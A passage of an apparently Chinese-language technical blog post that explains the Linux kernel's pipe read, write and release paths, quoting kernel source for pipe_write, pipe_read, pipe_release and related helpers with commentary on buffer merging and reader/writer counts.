class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) {</span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue) {</span><br><span class="line">ret = -EXDEV;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>注意这里的读者不是说read阻塞在该pipe上的任务数,而是以可读方式打开了该管道的计数,对于匿名管道来说readers和writers都为1.而对于有名管道fifo,则是通过fifo_open时的读写方式来增加计数.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> inode * <span class="title function_">get_pipe_inode</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">...</span><br><span class="line">pipe-&gt;readers = pipe-&gt;writers = <span class="number">1</span>;</span><br><span class="line">...</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>如果当前pipe不为空(head!=tail),则尝试先将部分数据写入上次使用的buffer,注意这里需要该buffer有PIPE_BUF_FLAG_CAN_MERGE的标志.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If it wasn't empty we try to merge new data into</span></span><br><span class="line"><span class="comment"> * the last buffer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * That naturally merges small writes, but it also</span></span><br><span class="line"><span class="comment"> * page-aligs the rest of the writes for large writes</span></span><br><span class="line"><span class="comment"> * spanning multiple pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) {</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line"><span class="type">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">    offset + chars &lt;= PAGE_SIZE) {</span><br><span class="line">ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &lt; chars)) {</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">buf-&gt;len += ret;</span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后是正式的大循环写入<br>每轮循环:</p><ul><li>如果!pipe-&gt;readers则返回-EPIPE;</li><li>为本次写入获取一张临时页面(pipe-&gt;tmp_pages),可能分配也可能使用上次失败留下或刚消耗完的.</li><li>插入到当前buffer-&gt;page中并拷贝用户数据.</li><li>如果pipe满了,直接返回(O_NONBLOCK)或唤醒rd_wait并加入wr_wait等待数据被消耗.<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) {</span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) {</span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) {</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line"><span class="type">int</span> copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page) {</span><br><span class="line">page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) {</span><br><span class="line">ret = ret ? : -ENOMEM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">pipe-&gt;tmp_page = page;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate a slot in the ring in advance and attach an</span></span><br><span class="line"><span class="comment"> * empty buffer.  If we fault or otherwise fail to use</span></span><br><span class="line"><span class="comment"> * it, either the reader will consume it or it'll still</span></span><br><span class="line"><span class="comment"> * be there for the next write.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) {</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) {</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">ret += copied;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Wait for buffer space to become available. */</span></span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) {</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current)) {</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -ERESTARTSYS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We're going to release the pipe lock and wait for more</span></span><br><span class="line"><span class="comment"> * space. We wake up any readers if necessary, and then</span></span><br><span class="line"><span class="comment"> * after waiting we need to re-check whether the pipe</span></span><br><span class="line"><span class="comment"> * become empty while we dropped the lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">if</span> (was_empty) {</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">}</span><br><span class="line">wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">wake_next_writer = <span class="literal">true</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="pipe-read"><a href="#pipe-read" class="headerlink" title="pipe_read"></a>pipe_read</h2><p>还是大循环的形式.将buf-&gt;page拷贝到io向量中后,若该page没有其他引用,将其作为pipe-&gt;tmp_page或直接释放.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_read</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *to)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">size_t</span> total_len = iov_iter_count(to);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="type">bool</span> was_full, wake_next_reader = <span class="literal">false</span>;</span><br><span class="line"><span class="type">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null read succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We only wake up writers if the pipe was full when we started</span></span><br><span class="line"><span class="comment"> * reading in order to avoid unnecessary wakeups.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * But when we do wake up writers, we do so using a sync wakeup</span></span><br><span class="line"><span class="comment"> * (WF_SYNC), because we want them to get going and generate more</span></span><br><span class="line"><span class="comment"> * data for us.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);</span><br><span class="line"><span class="keyword">for</span> (;;) {</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head = pipe-&gt;head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail = pipe-&gt;tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;note_loss) {</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification</span> <span class="title">n</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (total_len &lt; <span class="number">8</span>) {</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -ENOBUFS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">n.type = WATCH_TYPE_META;</span><br><span class="line">n.subtype = WATCH_META_LOSS_NOTIFICATION;</span><br><span class="line">n.info = watch_sizeof(n);</span><br><span class="line"><span class="keyword">if</span> (copy_to_iter(&amp;n, <span class="keyword">sizeof</span>(n), to) != <span class="keyword">sizeof</span>(n)) {</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">ret += <span class="keyword">sizeof</span>(n);</span><br><span class="line">total_len -= <span class="keyword">sizeof</span>(n);</span><br><span class="line">pipe-&gt;note_loss = <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe_empty(head, tail)) {</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];</span><br><span class="line"><span class="type">size_t</span> chars = buf-&gt;len;</span><br><span class="line"><span class="type">size_t</span> written;</span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chars &gt; total_len) {</span><br><span class="line"><span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) {</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -ENOBUFS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">chars = total_len;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">error = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (error) {</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = error;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);</span><br><span class="line"><span class="keyword">if</span> (unlikely(written &lt; chars)) {</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">ret += chars;</span><br><span class="line">buf-&gt;offset += chars;</span><br><span class="line">buf-&gt;len -= chars;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Was it a packet buffer? Clean up and exit */</span></span><br><span class="line"><span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) {</span><br><span class="line">total_len = chars;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!buf-&gt;len) {</span><br><span class="line">pipe_buf_release(pipe, buf);</span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)</span><br><span class="line">pipe-&gt;note_loss = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">tail++;</span><br><span class="line">pipe-&gt;tail = tail;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">}</span><br><span class="line">total_len -= chars;</span><br><span class="line"><span class="keyword">if</span> (!total_len)</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">/* common path: read succeeded */</span></span><br><span class="line"><span class="keyword">if</span> (!pipe_empty(head, tail))<span class="comment">/* More to do? */</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;writers)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) {</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We only get here if we didn't actually read anything.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * However, we could have seen (and removed) a zero-sized</span></span><br><span class="line"><span class="comment"> * pipe buffer, and might have made space in the buffers</span></span><br><span class="line"><span class="comment"> * that way.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can't make zero-sized pipe buffers by doing an empty</span></span><br><span class="line"><span class="comment"> * write (not even in packet mode), but they can happen if</span></span><br><span class="line"><span class="comment"> * the writer gets an EFAULT when trying to fill a buffer</span></span><br><span class="line"><span class="comment"> * that already got allocated and inserted in the buffer</span></span><br><span class="line"><span class="comment"> * array.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * So we still need to wake up any pending writers in the</span></span><br><span class="line"><span class="comment"> * _very_ unlikely case that the pipe was full, but we got</span></span><br><span class="line"><span class="comment"> * no data.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(was_full)) {</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * But because we didn't read anything, at this point we can</span></span><br><span class="line"><span class="comment"> * just return directly with -ERESTARTSYS if we're interrupted,</span></span><br><span class="line"><span class="comment"> * since we've done any required wakeups and there's no need</span></span><br><span class="line"><span class="comment"> * to mark anything accessed. And we've dropped the lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -ERESTARTSYS;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);</span><br><span class="line">wake_next_reader = <span class="literal">true</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="pipe-release"><a href="#pipe-release" class="headerlink" title="pipe_release"></a>pipe_release</h2><p>close掉pipe的两端即可释放.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pipe_release</span><br><span class="line">-&gt;put_pipe_info</span><br><span class="line"> -&gt;free_pipe_info</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">pipe_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> file-&gt;private_data;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line"><span class="keyword">if</span> (file-&gt;f_mode &amp; FMODE_READ)</span><br><span class="line">pipe-&gt;readers--;</span><br><span class="line"><span class="keyword">if</span> (file-&gt;f_mode &amp; FMODE_WRITE)</span><br><span class="line">pipe-&gt;writers--;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Was that the last reader or writer, but not the other side? */</span></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers != !pipe-&gt;writers) {</span><br><span class="line">wake_up_interruptible_all(&amp;pipe-&gt;rd_wait);</span><br><span class="line">wake_up_interruptible_all(&amp;pipe-&gt;wr_wait);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);</span><br><span class="line">}</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line">put_pipe_info(inode, pipe);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">put_pipe_info</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> pipe_inode_info *pipe)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> kill = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;inode-&gt;i_lock);</span><br><span class="line"><span class="keyword">if</span> (!--pipe-&gt;files) {</span><br><span class="line">inode-&gt;i_pipe = <span class="literal">NULL</span>;</span><br><span class="line">kill = <span class="number">1</span>;</span><br><span class="line">}</span><br><span 